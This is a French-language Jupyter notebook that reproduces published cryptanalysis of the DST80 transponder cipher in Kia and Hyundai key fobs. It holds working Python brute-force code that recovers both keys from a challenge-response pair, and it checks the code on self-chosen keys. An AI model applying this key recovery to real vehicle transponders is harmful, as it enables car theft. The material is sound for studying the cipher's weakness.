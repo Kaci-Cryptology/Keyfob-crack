{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Brute Force pour les modèles Kia et Hyundai\n",
    "\n",
    "Auteur: [Kaci Amaouche](mailto:amaouchekaci28@gmail.com)\n",
    "\n",
    "Dans ce [Jupyter](https://jupyter.org/) notebook,nous présentons une attaque sur DST80 pour les modèles Hyundai et Kia. Si vous n'êtes pas familier avec Jupyter, vous pouvez jeter un coup d'œil rapide à la documentation ou aux tutoriels disponibles[Notebook Basics](https://jupyter-notebook.readthedocs.io/en/stable/examples/Notebook/Notebook%20Basics.html) guide (~5min).\n",
    "\n",
    "Ce notebook comporte:\n",
    "\n",
    "* [Configuration de l'environnement]\n",
    "* [Implémentation]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1 - Configuration de l'environnement"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pour pouvoir exécuter ces scripts, il va falloir:\n",
    "1. Ce notebook (the `.ipynb` file) et le script DST80_Algo qui doit être dans le même répertoire\n",
    "1. Python >= 3.8\n",
    "1. Seules les librairies standard sont utilisées "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2 - Implémentation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Une brève explication"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Les chercheurs ont prouvé (les détails sont expliqués en profondeur dans le document \"DST80_cryptanalyse\" de ce même référentiel) que tous les modèles de voitures Kia et Hyundai possèdent une partie fixe de 16 bits, positionnée à droite pour la clé keyL et à gauche pour la clé keyR. Cela entraîne une réduction de l'entropie de 80 bits à (40-16)+(40-16) = 48 bits.\n",
    "\n",
    "Mieux encore, ils ont identifié une relation linéaire entre keyL et keyR, ce qui réduit davantage l'entropie à seulement 24 bits. En conséquence, la complexité temporelle totale s'établit à $2^{24}$ opérations de chiffrement."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On importe le script qui contient l'algorithme de chiffrement DST80"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "from DST80_Algo import *"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pour l'implémentation, voici le pseudo-code proposé par les chercheurs :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Algorithme 3 : Récupérer les clés DST80 pour les transpondeurs configurés pour les véhicules Hyundai et Kia. Les deux constantes de 2 octets X et Y sont la partie fixe des deux clés.\n",
    "\n",
    "#1: fonction Rechercher_Cle(C, S). Avec C - Défi ; S - Signature\n",
    "#2: pour i dans {0...224} faire\n",
    "#3:     keyL[4], keyL[3], keyL[2] ← i[0], i[1], i[2]\n",
    "#4:     keyL[1], keyL[0] ← X\n",
    "#5:     keyR[4], keyR[3] ← Y\n",
    "#6:     keyR[2] ← ¬keyL[2]\n",
    "#7:     keyR[1] ← ¬keyL[3]\n",
    "#8:     keyR[0] ← ¬keyL[4]\n",
    "#9:     crc, sig ← DST80(C, keyL, keyR)\n",
    "#10:    si sig == S alors retourner keyL, keyR\n",
    "#11:    fin si\n",
    "#12: fin pour\n",
    "#13: fin fonction\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pour l'implémentation, une approche alternative serait d'utiliser trois boucles imbriquées, chacune parcourant un espace de $2^8$ itérations."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "def search_key(Challenge, Response, X, Y):\n",
    "    \"\"\"\n",
    "    Recherche des clés DST80 en utilisant une approche de force brute.\n",
    "\n",
    "    Cette fonction effectue une recherche par force brute pour trouver les clés DST80\n",
    "    qui correspondent à un défi et une signature donnés. Elle itère à travers\n",
    "    les valeurs de clé possibles en utilisant des boucles imbriquées.\n",
    "\n",
    "    Args:\n",
    "    Challenge (int): Valeur du défi.\n",
    "    Response (int): Valeur de la signature / Response.\n",
    "    X (int): Valeur de la constante X.\n",
    "    Y (int): Valeur de la constante Y.\n",
    "\n",
    "    Returns:\n",
    "    tuple: Un tuple contenant les représentations hexadécimales de keyL et keyR trouvées si une correspondance est trouvée.\n",
    "           Renvoie None si aucune clé correspondante n'est trouvée.\n",
    "    \"\"\"\n",
    "\n",
    "    # Initialisation des variables\n",
    "    s = 0\n",
    "    keyL, keyR = [0, 0, 0, 0, 0], [0, 0, 0, 0, 0]\n",
    "\n",
    "    # Boucle pour parcourir les valeurs possibles de keyL[0]\n",
    "    for k in range(2**8):\n",
    "        # Boucle pour parcourir les valeurs possibles de keyL[1]\n",
    "        for j in range(2**8):\n",
    "            # Boucle pour parcourir les valeurs possibles de keyL[2]\n",
    "            for i in range(2**8):\n",
    "                # Remplissage des valeurs de keyL et keyR en fonction des constantes X et Y\n",
    "                keyL[0], keyL[1], keyL[2] = i, j, k\n",
    "                keyL[3], keyL[4] = divmod(X, 256) # La partie fixe X\n",
    "                keyR[0], keyR[1] = divmod(Y, 256) # La partie fixe Y\n",
    "                keyR[2], keyR[3], keyR[4] = 255 - k, 255 - j, 255 - i\n",
    "\n",
    "                # Conversion des parties de clé en valeurs entières\n",
    "                kl = (keyL[0] << 32) | (keyL[1] << 24) | (keyL[2] << 16) | (keyL[3] << 8) | keyL[4]\n",
    "                kr = (keyR[0] << 32) | (keyR[1] << 24) | (keyR[2] << 16) | (keyR[3] << 8) | keyR[4]\n",
    "\n",
    "                # Calcul du résultat de DST80 avec les clés candidates\n",
    "                s = dst80(kl, kr, Challenge)\n",
    "\n",
    "                # Vérification si le résultat correspond à la signature S\n",
    "                if s == Response:\n",
    "                    # Retourne les clés trouvées au format hexadécimal\n",
    "                    return hex(kl), hex(kr)\n",
    "    # Aucune clé correspondante n'a été trouvée\n",
    "    return None\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On pourra prendre un exemple pour vérifier la validité de cette attaque "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "# On choisit des valeurs aléatoires pour  keyL et keyR \n",
    "keyL,keyR=0x955a3eaaaa ,0xaaaac1a56a\n",
    "\n",
    "#On extraire ensuite les deux parties fixes X et Y qui sont de la forme  keyL= A | X et keyR = Y | B , avec A et B sur 24 bits.\n",
    "X,Y=(keyL&0xFFFF),(keyR>>24)&0xFFFF\n",
    "\n",
    "#On prend également un challenge aléatoire\n",
    "Challenge=123\n",
    "\n",
    "#On calcule ensuite le chiffré du challenge\n",
    "Response=dst80(keyL, keyR, Challenge)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Il suffit d'appeler la fonction avec ces arguments"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "keyL_found, keyR_found = search_key(Challenge, Response, X, Y)\n",
    "print(keyL_found==keyL, keyR_found==keyR)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Afin d'obtenir une performance optimale, il est recommandé d'adopter le module PyPy, qui génère une accélération potentielle allant jusqu'à 100 fois par rapport à d'autres environnements d'exécution.\n",
    "\n",
    "Dans le contexte de cet exemple, le temps nécessaire sera significatif. J'ai réalisé des tests de performances pour cette attaque en utilisant le module PyPy, et dans le scénario le plus exigeant, l'attaque pourrait nécessiter jusqu'à 6,5 heures pour s'achever."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Afin de garantir le bon fonctionnement, mes tests suggèrent la possibilité de réduire la complexité de l'algorithme (uniquement dans ce cas précis).\n",
    " \n",
    "Cependant, il est impératif de maintenir l'algorithme dans sa forme générale pour les autres cas.\n",
    "\n",
    "Voici une approche pour adapter les boucles de l'algorithme spécifiquement dans cet exemple, afin de valider son fonctionnement "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "def test_validite(Challenge, Response, X, Y):\n",
    "   \n",
    "    # Initialisation des variables\n",
    "    s = 0\n",
    "    keyL, keyR = [0, 0, 0, 0, 0], [0, 0, 0, 0, 0]\n",
    "\n",
    "    # On modifie la boucle\n",
    "    for k in range(0x3e, 2**8):\n",
    "        # On modifie la boucle\n",
    "        for j in range(0x50, 2**8):\n",
    "            # Boucle pour parcourir les valeurs possibles de keyL[2]\n",
    "            for i in range(2**8):\n",
    "                # Remplissage des valeurs de keyL et keyR en fonction des constantes X et Y\n",
    "                keyL[0], keyL[1], keyL[2] = i, j, k\n",
    "                keyL[3], keyL[4] = divmod(X, 256) # La partie fixe X\n",
    "                keyR[0], keyR[1] = divmod(Y, 256) # La partie fixe Y\n",
    "                keyR[2], keyR[3], keyR[4] = 255 - k, 255 - j, 255 - i\n",
    "\n",
    "                # Conversion des parties de clé en valeurs entières\n",
    "                kl = (keyL[0] << 32) | (keyL[1] << 24) | (keyL[2] << 16) | (keyL[3] << 8) | keyL[4]\n",
    "                kr = (keyR[0] << 32) | (keyR[1] << 24) | (keyR[2] << 16) | (keyR[3] << 8) | keyR[4]\n",
    "\n",
    "                # Calcul du résultat de DST80 avec les clés candidates\n",
    "                s = dst80(kl, kr, Challenge)\n",
    "\n",
    "                # Vérification si le résultat correspond à la signature S\n",
    "                if s == Response:\n",
    "                    # Retourne les clés trouvées au format hexadécimal\n",
    "                    return hex(kl), hex(kr)\n",
    "    # Aucune clé correspondante n'a été trouvée\n",
    "    return None"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On l'appelle avec les arguments précédents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x955a3eaaaa 0xaaaac1a56a\n"
     ]
    }
   ],
   "source": [
    "keyL_found, keyR_found = test_validite(Challenge, Response, X, Y)\n",
    "print(keyL_found, keyR_found)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On voit clairement que c'est les bonnes clés"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
